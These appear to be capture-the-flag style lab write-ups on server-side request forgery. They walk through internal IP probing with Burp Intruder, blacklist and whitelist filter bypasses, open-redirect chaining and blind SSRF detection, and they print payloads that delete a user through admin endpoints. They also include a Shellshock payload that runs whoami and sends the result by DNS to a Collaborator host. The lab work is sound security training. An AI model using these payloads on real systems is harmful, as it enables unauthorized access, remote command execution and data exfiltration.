# LAB : 1 Basic SSRF against the local server
## **Visit the Product Page**:
 - Open the target application in your browser.
 - Navigate to a product page and click the **Check stock** button. This action triggers a request to check the stock status of the product.
## **Intercept the Request in Burp Suite**:
 - Open **Burp Suite** and ensure that the **Proxy** tool is active and intercepting requests.
 - Click **Check stock** again, and the request will be captured in Burp Suite's Proxy.
## **Send the Request to Burp Intruder**:
 - In the **Proxy** tab, right-click the intercepted request and select **Send to Intruder**.
## **Configure the Intruder Attack**:
 - Go to the **Intruder** tab.
 - In the **Positions** sub-tab, clear any default payload positions.
 - Locate the `stockApi` parameter in the request. It will look something like this:
     ```
     stockApi=http://stock.veliketoshop.net:8080/product/stock/check$31
     ```
 - Change the `stockApi` parameter to:
     ```
     stockApi=http://192.168.0.1:8080/admin
     ```
 - Highlight the final octet of the IP address (the number `1`) and click **Add §**. The parameter should now look like this:
     ```
     stockApi=http://192.168.0.§1§:8080/admin
     ```
## **Set Up Payloads**:
 - Go to the **Payloads** sub-tab.
 - Under **Payload type**, select **Numbers**.
 - Configure the payload as follows:
    - **From**: `1`
     - **To**: `255`
     - **Step**: `1`
 - This will generate numbers from 1 to 255, allowing you to probe all IP addresses in the `192.168.0.x` range.

## **Start the Attack**:
   - Click **Start attack** in the top-right corner.
   - Burp Intruder will send the request to each IP address in the `192.168.0.x` range.

## **Analyze the Results**:
   - Once the attack is complete, click on the **Status** column to sort the results by status code in ascending order.
   - Look for a single entry with a **status code of 200**. This indicates that the request to the admin interface was successful.

## **Send the Request to Burp Repeater**:
   - Right-click the request with the status code of 200 and select **Send to Repeater**.

## **Exploit the Admin Interface**:
   - In the **Repeater** tab, modify the `stockApi` parameter to delete a user account. Change the path to:
     ```
     /admin/delete?username=carlos
     ```
   - The full `stockApi` parameter should now look like this:
     ```
     stockApi=http://192.168.0.X:8080/admin/delete?username=carlos
     ```
     (Replace `X` with the correct octet from the successful request.)
![Screenshot from 2025-01-28 18-39-25](https://github.com/user-attachments/assets/653041ce-b925-4f94-82fa-8bcef2443c6b)

## **Send the Request**:
    - Click **Send** in the Repeater tab.
    - If the request is successful, the user `carlos` will be deleted from the system.
![Screenshot from 2025-01-28 18-26-53](https://github.com/user-attachments/assets/215836aa-19f5-4ddc-919c-e424fa8ae65f)

---

#### **Explanation of the Attack**:

1. **SSRF Vulnerability**:
   - The application is vulnerable to SSRF because it allows user-controlled input (the `stockApi` parameter) to make requests to internal systems.
   - By modifying the `stockApi` parameter, an attacker can force the server to make requests to internal IP addresses.

2. **Probing Internal IPs**:
   - The attacker uses Burp Intruder to probe all IP addresses in the `192.168.0.x` range to find the internal admin interface.

3. **Accessing the Admin Interface**:
   - Once the admin interface is found, the attacker uses Burp Repeater to interact with it and delete a user account.

---

---

# **Lab 2 Write-Up: Exploiting SSRF to Bypass Filters and Access Admin Interface**

---

## **Objective**:
The goal of this lab is to exploit a **Server-Side Request Forgery (SSRF)** vulnerability to bypass input filters and access an internal admin interface. This lab demonstrates how SSRF can be used to interact with internal systems by circumventing common defenses like blacklists.

---

## **Steps to Complete the Lab**: (blacklist)

1. **Visit the Product Page**:
   - Open the target application in your browser.
   - Navigate to a product page and click the **Check stock** button. This action triggers a request to check the stock status of the product.

2. **Intercept the Request in Burp Suite**:
   - Open **Burp Suite** and ensure that the **Proxy** tool is active and intercepting requests.
   - Click **Check stock** again, and the request will be captured in Burp Suite's Proxy.

3. **Send the Request to Burp Repeater**:
   - In the **Proxy** tab, right-click the intercepted request and select **Send to Repeater**.

4. **Test Blocked URLs**:
   - Go to the **Repeater** tab.
   - Locate the `stockApi` parameter in the request. It will look something like this:
     ```
     stockApi=http://stock.veliketoshop.net:8080/product/stock/check$31
     ```
   - Modify the `stockApi` parameter to test the following URLs:
     - `http://127.0.0.1/`
     - `http://127.0.0.1/admin`
     - `http://localhost/`
   - Observe that these requests are blocked by the application's input filters.

5. **Bypass the Block Using Obfuscation**:
   - To bypass the block, change the spelling of `localhost/admin` using mixed case (case variation):
     ```
     stockApi=http://LoCaLhOsT/AdMiN
     ```
   - Send the request in Burp Repeater.

6. **Access the Admin Interface**:
   - If the bypass is successful, you should receive a response indicating access to the admin interface.

7. **Delete the Target User**:
   - Modify the `stockApi` parameter to delete the target user (e.g., `carlos`):
     ```
     stockApi=http://LoCaLhOsT/AdMiN/delete?username=carlos
     ```
     ![Screenshot from 2025-01-28 19-12-30](https://github.com/user-attachments/assets/26839a61-a8d3-4b81-b2a4-86790c0cec69)

   - Send the request in Burp Repeater.
   - If the request is successful, the user `carlos` will be deleted from the system.
![Screenshot from 2025-01-28 19-12-16](https://github.com/user-attachments/assets/54f1e250-12cf-436c-8f6e-c218b2d1c6cb)

---

#### **Explanation of the Attack**:

1. **SSRF Vulnerability**:
   - The application is vulnerable to SSRF because it allows user-controlled input (the `stockApi` parameter) to make requests to internal systems.
   - However, the application has implemented a blacklist filter to block common SSRF payloads like `127.0.0.1` and `localhost`.

2. **Bypassing the Blacklist**:
   - The attacker uses **case variation** to obfuscate the blocked strings (`localhost` and `admin`).
   - By changing the spelling to `LoCaLhOsT` and `AdMiN`, the attacker bypasses the filter and gains access to the admin interface.

3. **Exploiting the Admin Interface**:
   - Once access to the admin interface is achieved, the attacker can perform unauthorized actions, such as deleting a user account.

---

# **Lab 3 Write-Up: SSRF with whitelist-based input filter**

---

## **Objective**
The goal of this lab is to exploit a **Server-Side Request Forgery (SSRF)** vulnerability in a web application that uses a whitelist filter to restrict access to specific domains. By manipulating the URL parsing behavior, we will bypass the whitelist filter and gain access to the admin interface to delete the target user (`carlos`).

---

## **Steps to Exploit the Vulnerability**

1. **Visit the Product Page and Intercept the Request**
   - Navigate to the product page on the target website.
   - Click the **"Check stock"** button to trigger a request to check the stock status.
   - Open **Burp Suite** and ensure that the proxy is running to intercept the request.

2. **Intercept and Send the Request to Burp Repeater**
   - In Burp Suite, locate the intercepted request in the **Proxy** tab.
   - Right-click the request and select **Send to Repeater** to analyze and manipulate it further.

3. **Analyze the `stockApi` Parameter**
   - In the **Repeater** tab, observe the `stockApi` parameter in the request. This parameter contains the URL that the server uses to check stock information.
   - Change the URL in the `stockApi` parameter to `http://127.0.0.1/` and send the request.
   ![Screenshot from 2025-01-30 09-30-01](https://github.com/user-attachments/assets/8b71eb55-8534-47fb-ac97-c5e8c20ec3bb)

   - Observe that the application rejects the request, indicating that the server is parsing the URL, extracting the hostname, and validating it against a whitelist.

4. **Test Embedded Credentials in the URL**
   - Change the URL to `http://abc@stock.weliketoshop.net/` and send the request.
   - Observe that the request is showing internal server error, indicating that the URL parser supports embedded credentials .
   - Modify the URL to `http://abc%2523@stock.weliketoshop.net/` and send the request.
   ![Screenshot from 2025-01-30 09-30-28](https://github.com/user-attachments/assets/d860c9a9-e688-45cf-8628-7099d0711da2)

   - Observe that the request is now rejected, indicating that the `#` -> %2523 character is causing the URL to be parsed differently.

6. **Double-URL Encode the `#` Character**
   - Double-URL encode the `#` character to `%2523` and update the URL to `http://abc%2523@stock.weliketoshop.net/`.
   - Send the request and observe the **"Internal Server Error"** response. This indicates that the server attempted to connect to `username` as the hostname, suggesting a potential vulnerability in the URL parsing logic.
![Screenshot from 2025-01-30 09-28-33](https://github.com/user-attachments/assets/eb460c7c-235f-4775-884f-3a472b3f5eab)

7. **Exploit the Vulnerability to Access the Admin Interface**
   - To access the admin interface and delete the target user (`carlos`), construct the following URL:
     ```
     http://localhost%2523@stock.weliketoshop.net/admin/
     ```
   - Update the `stockApi` parameter with this URL and send the request.
   - Observe that the server processes the request, bypassing the whitelist filter, modify the request to "delete?username=carlos" to delete the target user.
![Screenshot from 2025-01-30 09-28-40](https://github.com/user-attachments/assets/d6d331a6-160a-4fa6-92d0-b253a4d98bbc)
![Screenshot from 2025-01-30 09-29-08](https://github.com/user-attachments/assets/6a4732c1-52f0-4234-901a-10ebbdb422dd)

---

## **Explanation of the Exploit**
- **Whitelist Filter Bypass**: The whitelist filter validates the hostname in the URL but does not account for embedded credentials or URL-encoded characters. By embedding `localhost` as the username and using double-URL encoding for the `#` character, we trick the server into connecting to `localhost` instead of the whitelisted domain.
- **URL Parsing Inconsistencies**: The server's URL parser interprets `localhost%2523@stock.weliketoshop.net` as `localhost` (due to the `%2523` acting as a fragment delimiter), while the whitelist filter sees `stock.weliketoshop.net`.
![Screenshot from 2025-01-30 09-29-19](https://github.com/user-attachments/assets/4fd36b93-d043-40f8-b3ad-55cd26b393df)


# **Lab 4 Write-Up: Exploiting Open Redirection to Access the Admin Interface**

---

## **Objective**
The goal of this lab is to exploit an **open redirection vulnerability** in a web application to gain access to the admin interface and delete the target user (`carlos`). By manipulating the `path` parameter in the redirection response, we will trick the server into redirecting to the admin interface and performing the deletion.

---

## **Steps to Exploit the Vulnerability**

1. **Visit the Product Page and Intercept the Request**
   - Navigate to the product page on the target website.
   - Click the **"Check stock"** button to trigger a request to check the stock status.
   - Open **Burp Suite** and ensure that the proxy is running to intercept the request.

2. **Intercept and Send the Request to Burp Repeater**
   - In Burp Suite, locate the intercepted request in the **Proxy** tab.
   - Right-click the request and select **Send to Repeater** to analyze and manipulate it further.

3. **Tamper with the `stockApi` Parameter**
   - In the **Repeater** tab, observe the `stockApi` parameter in the request. This parameter contains the URL that the server uses to check stock information.
   - Try changing the `stockApi` parameter to point to a different host (e.g., `http://evil-site.com`).
   - Observe that the server does not allow direct requests to external hosts, indicating that the `stockApi` parameter is restricted.

4. **Explore the "Next Product" Feature**
   - Go back to the product page and click **"Next product"**.
   - Intercept the request in Burp Suite and observe the response.
   - Notice that the `path` parameter in the request is placed into the `Location` header of the redirection response. For example:
     ```
     HTTP/1.1 302 Found
     Location: /product/nextProduct?path=/product/123
     ```
   - This behavior indicates an **open redirection vulnerability**, as the server does not validate the `path` parameter.

5. **Exploit the Open Redirection Vulnerability**
   - To exploit the vulnerability, create a URL that redirects to the admin interface:
     ```
     /product/nextProduct?path=http://192.168.0.12:8080/admin
     ```
   ![Screenshot from 2025-01-30 11-05-32](https://github.com/user-attachments/assets/b841906d-730d-4309-9662-1c19b77cbeef)

   - Feed this URL into the `stockApi` parameter in the stock checker request and send it.
   - Observe that the stock checker follows the redirection and displays the admin page.

6. **Delete the Target User**
   - To delete the target user (`carlos`), modify the `path` parameter to point to the deletion endpoint:
     ```
     /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
     ```
   ![Screenshot from 2025-01-30 11-05-10](https://github.com/user-attachments/assets/a02ed6bf-4725-4ce9-89ee-fe94653d6aaf)

   - Feed this URL into the `stockApi` parameter and send the request.
   - Observe that the server processes the request, deletes the target user, and completes the lab.
![Screenshot from 2025-01-30 11-05-06](https://github.com/user-attachments/assets/e809f18a-53ba-4a72-85f7-1b56839c7593)

---

## **Explanation of the Exploit**
- **Open Redirection Vulnerability**: The server does not validate the `path` parameter in the redirection response, allowing attackers to redirect users to arbitrary URLs.
- **Chaining Vulnerabilities**: By combining the open redirection vulnerability with the stock checker's behavior of following redirections, we can trick the server into accessing the admin interface and performing privileged actions.

---

#### **Mitigation Recommendations**
1. **Validate Redirection URLs**:
   - Restrict redirection URLs to trusted, predefined paths or domains.
   - Reject any URLs that contain external hosts or unexpected characters.

2. **Avoid User-Controlled Redirection**:
   - Do not allow users to control redirection URLs directly. If necessary, use a whitelist of allowed URLs.

3. **Use Relative URLs**:
   - Use relative paths for redirection instead of full URLs to prevent external redirection.

4. **Test for Vulnerabilities**:
   - Regularly test the application for open redirection and other vulnerabilities to identify and fix potential issues.


# Lab: Blind SSRF with out-of-band detection

### **1. Install and Configure Burp Collaborator**
- Burp **Collaborator Everywhere** is a tool in **Burp Suite Professional** that helps detect **out-of-band (OOB) vulnerabilities**, like **Blind SSRF**.
- Add the **target domain** (PortSwigger lab) to **Burp’s target scope**, so the extension will monitor interactions.
![Screenshot from 2025-01-30 18-27-41](https://github.com/user-attachments/assets/798b0373-3e3a-492f-8cf9-fcad208b0833)

---

### **2. Discovering Blind SSRF via the Referer Header**
- As you browse the **product page**, Burp **detects an HTTP request** to Burp Collaborator.
- The **Referer header** is being used to send **requests to external URLs**.
- The **User-Agent header** is included in the request.

#### **Why is this important?**
- The fact that the request includes **your User-Agent string** means that **server-side processing is happening**.
- If a server-side process is using Bash to handle HTTP headers, it may be vulnerable to **Shellshock**.

---

### **3. Preparing the Shellshock Payload**
- Now, we craft a **Shellshock exploit** using the Burp Collaborator domain.

#### **Shellshock Payload:**
```bash
() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
```

#### **What does this do?**
- `() { :; };` → This **triggers Shellshock** (vulnerable Bash execution).
- `/usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN` →  
  - Runs the `nslookup` command.
  - The `whoami` command gets the **current OS username**.
  - The result is sent as a **DNS query** to **Burp Collaborator**.
  - This confirms **command execution on the server**.

---

### **4. Inject the Payload via Burp Intruder**
- **Modify the User-Agent header** to include the Shellshock payload.
- **Modify the Referer header**:
  - Set it to `http://192.168.0.1:8080`
  - Highlight the last **octet** of the IP (`1`) and **add a payload position (`§`)**.
  - This helps test multiple IPs in the **internal network**.
![Screenshot from 2025-01-30 18-48-11](https://github.com/user-attachments/assets/dad067ef-a8af-4c10-863f-b2d4efdffa25)

#### **Why brute-force the last octet?**
- The vulnerable service might be **inside the internal network**.
- By iterating from `192.168.0.1` to `192.168.0.255`, we can target **different internal servers**.

---

### **5. Run the Attack and Check for Out-of-Band Interactions**
- Start Burp Intruder to send requests.
- Go to **Burp Collaborator** and **Poll for interactions**.
- If **DNS interactions appear**, it means:
  - The server executed the **nslookup** command.
  - The **username** was sent as a DNS request.
  - **We achieved RCE** (Remote Code Execution).

---

### **6. Extract the OS Username to Complete the Lab**
- Find the **username** in the Burp Collaborator logs.
- Submit it to complete the lab.

---

## **Why Does This Work?**
1. **Blind SSRF** allows you to make **outbound requests** from the server.
2. **Shellshock** lets you execute **arbitrary commands** via Bash.
3. **Burp Collaborator** detects DNS interactions, proving RCE.
4. **Brute-forcing the last octet** of an internal IP helps explore the internal network.

---

## **Key Takeaways**
- **Blind SSRF + Shellshock = RCE** if the server processes headers with Bash.
- **Burp Collaborator** helps track blind vulnerabilities.
- **Brute-forcing internal IPs** can reveal hidden services.


## ** Steps to Identify Blind SSRF**  

### ** Visit a Product Page & Intercept the Request**
1. Open the **target web application** in your browser (configured to route traffic through **Burp Suite Proxy**).  
2. Navigate to a **product page** (e.g., `https://vulnsite.com/product/123`).  
3. **Intercept the request** in **Burp Suite Proxy**.  
4. Send the request to **Burp Repeater** (`Right-click → Send to Repeater`).  

---

### ** Modify the Request in Burp Repeater**  
1. Go to the **Repeater tab**.  
2. Locate the **Referer header** in the request, which might look like this:  
   ```
   Referer: https://vulnsite.com/product/123
   ```
3. **Right-click** on the **Referer header** and select **"Insert Collaborator Payload"**.  
   - This replaces the original domain (`vulnsite.com`) with a unique **Burp Collaborator URL** (e.g., `abc123.burpcollaborator.net`).  
4. Click **Send** to execute the request.  

---

### ** Monitor Burp Collaborator for Interactions**  
1. Open the **Burp Collaborator tab**.  
2. Click **"Poll now"** to check if the application made any outbound requests.  
3. If nothing appears immediately, wait a few seconds and **poll again**, as the request may be processed asynchronously.  
4. If successful, you will see **DNS and HTTP interactions** listed.  

---

## ** Understanding the Results**  

| Interaction Type | Meaning |
|-----------------|---------|
| **DNS Lookup** | The application tried to resolve the **Burp Collaborator domain**, meaning it processed the request but may have blocked the HTTP request. This confirms potential **SSRF**. |
| **HTTP Request** | The application made a full HTTP request to the Collaborator URL, confirming a **clear SSRF vulnerability**. |

---

## ** Conclusion & Next Steps**  
- If you observe **DNS or HTTP interactions**, the application is vulnerable to **Blind SSRF**.  
- Further exploitation could involve testing **internal endpoints** or escalating to **remote code execution (RCE)** if the request reaches a vulnerable service.  
- If no interaction occurs, the application might have **outbound request filtering**, requiring **alternate payloads** or internal brute-forcing.  

